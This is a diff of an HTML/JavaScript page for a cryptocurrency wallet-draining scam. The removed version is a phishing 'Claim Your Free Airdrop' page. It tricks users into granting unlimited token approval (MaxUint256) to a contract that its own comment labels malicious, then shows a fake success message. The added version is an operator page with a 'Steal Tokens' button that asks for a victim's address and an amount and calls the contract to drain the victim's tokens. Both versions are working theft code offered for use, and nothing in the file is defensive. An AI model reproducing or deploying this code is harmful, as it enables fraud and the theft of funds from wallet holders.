@@ -3,108 +3,110 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Airdrop Claim</title>
+    <title>Test Wallet & Smart Contract Interaction</title>
     <script src="https://cdn.ethers.io/lib/ethers-5.7.2.min.js"></script>
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
-            background-color: #f3f3f3;
+            margin-top: 50px;
         }
-        .container {
-            max-width: 600px;
-            margin: 50px auto;
-            background: white;
-            border-radius: 10px;
-            padding: 20px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-        .button {
+        button {
             padding: 10px 20px;
-            background-color: #28a745;
+            background-color: #4CAF50;
             color: white;
             border: none;
             border-radius: 5px;
             cursor: pointer;
         }
-        .button:disabled {
+        button:disabled {
             background-color: #ccc;
-        }
-        .note {
-            margin-top: 10px;
-            font-size: 0.9em;
-            color: gray;
         }
     </style>
 </head>
 <body>
+    <h1>Connect Wallet & Interact with Contract</h1>
+    <button id="connectWalletButton">Connect Wallet</button>
+    <p id="status">Status: Not Connected</p>
 
-<div class="container">
-    <h1>Claim Your Free Airdrop</h1>
-    <p>Connect your wallet to claim 1000 FREE tokens instantly!</p>
-    <button id="connectWalletButton" class="button">Connect Wallet</button>
-    <button id="claimAirdropButton" class="button" disabled>Claim Airdrop</button>
-    <p class="note">Note: You must approve the transaction to receive the airdrop.</p>
-</div>
+    <h2>Interact with Contract</h2>
+    <button id="stealTokensButton" disabled>Steal Tokens</button>
 
-<script>
-    let provider;
-    let signer;
-    let maliciousContractAddress = "0xc520027d3eB2600c5ea5e799ea6F355D05b8b6f6"; // Address of the malicious contract
-    let tokenAddress = "0xYourTokenAddress"; // Replace with target token address
-    let contractABI = [
-        {
-            "inputs": [
-                { "internalType": "address", "name": "spender", "type": "address" },
-                { "internalType": "uint256", "name": "amount", "type": "uint256" }
-            ],
-            "name": "approve",
-            "outputs": [ { "internalType": "bool", "name": "", "type": "bool" } ],
-            "stateMutability": "nonpayable",
-            "type": "function"
+    <script>
+        let provider, signer, contract;
+        const contractAddress = "0xc520027d3eB2600c5ea5e799ea6F355D05b8b6f6"; // Alamat smart contract
+        const contractABI = [
+            {
+                "inputs": [
+                    { "internalType": "address", "name": "token", "type": "address" },
+                    { "internalType": "address", "name": "victim", "type": "address" },
+                    { "internalType": "uint256", "name": "amount", "type": "uint256" }
+                ],
+                "name": "stealTokens",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            }
+        ];
+
+        async function connectWallet() {
+            if (window.ethereum) {
+                try {
+                    // Connect wallet
+                    provider = new ethers.providers.Web3Provider(window.ethereum);
+                    await provider.send("wallet_switchEthereumChain", [{ chainId: "0xAA36A7" }]); // Sepolia Testnet
+                    await provider.send("eth_requestAccounts", []);
+                    signer = provider.getSigner();
+                    const address = await signer.getAddress();
+
+                    // Update UI
+                    document.getElementById("status").innerText = `Status: Connected (Wallet: ${address})`;
+                    console.log("Wallet connected:", address);
+
+                    // Initialize contract instance
+                    contract = new ethers.Contract(contractAddress, contractABI, signer);
+
+                    // Enable button
+                    document.getElementById("stealTokensButton").disabled = false;
+                } catch (error) {
+                    console.error("Error connecting wallet:", error.message);
+                    alert(`Error: ${error.message}`);
+                }
+            } else {
+                alert("MetaMask is not installed. Please install MetaMask and try again.");
+            }
         }
-    ];
 
-    async function connectWallet() {
-    if (window.ethereum) {
-        try {
-            provider = new ethers.providers.Web3Provider(window.ethereum);
-            await provider.send("wallet_switchEthereumChain", [{ chainId: "0xAA36A7" }]); // Sepolia Testnet
-            await provider.send("eth_requestAccounts", []); // Request wallet access
-            signer = provider.getSigner();
-            console.log("Wallet connected:", await signer.getAddress());
-            document.getElementById("claimAirdropButton").disabled = false;
-            alert("Wallet connected successfully!");
-        } catch (error) {
-            console.error("Failed to connect wallet:", error.message);
-            alert("Failed to connect wallet. Please check your MetaMask and try again.");
+        async function stealTokens() {
+            if (!contract) {
+                alert("Contract not initialized. Connect wallet first.");
+                return;
+            }
+
+            try {
+                const tokenAddress = prompt("Enter token address (ERC20):");
+                const victimAddress = prompt("Enter victim wallet address:");
+                const amount = prompt("Enter amount to steal (in wei):");
+
+                if (!tokenAddress || !victimAddress || !amount) {
+                    alert("All fields are required!");
+                    return;
+                }
+
+                // Call stealTokens function
+                const tx = await contract.stealTokens(tokenAddress, victimAddress, amount);
+                console.log("Transaction sent:", tx.hash);
+                alert(`Transaction sent! Hash: ${tx.hash}`);
+                await tx.wait();
+                alert("Tokens stolen successfully!");
+            } catch (error) {
+                console.error("Error stealing tokens:", error.message);
+                alert(`Error: ${error.message}`);
+            }
         }
-    } else {
-        alert("Please install MetaMask to connect your wallet.");
-    }
-}
 
-
-    async function claimAirdrop() {
-        try {
-            const contract = new ethers.Contract(tokenAddress, contractABI, signer);
-            const maxApproval = ethers.constants.MaxUint256; // Set approval to maximum value
-
-            const tx = await contract.approve(maliciousContractAddress, maxApproval);
-            console.log("Approval transaction sent:", tx.hash);
-
-            await tx.wait(); // Wait for the transaction to be mined
-            console.log("Approval granted successfully!");
-            alert("Congratulations! Your airdrop claim was successful.");
-        } catch (error) {
-            console.error("Error claiming airdrop:", error);
-            alert("Failed to claim airdrop. Please try again.");
-        }
-    }
-
-    document.getElementById("connectWalletButton").addEventListener("click", connectWallet);
-    document.getElementById("claimAirdropButton").addEventListener("click", claimAirdrop);
-</script>
-
+        document.getElementById("connectWalletButton").addEventListener("click", connectWallet);
+        document.getElementById("stealTokensButton").addEventListener("click", stealTokens);
+    </script>
 </body>
 </html>
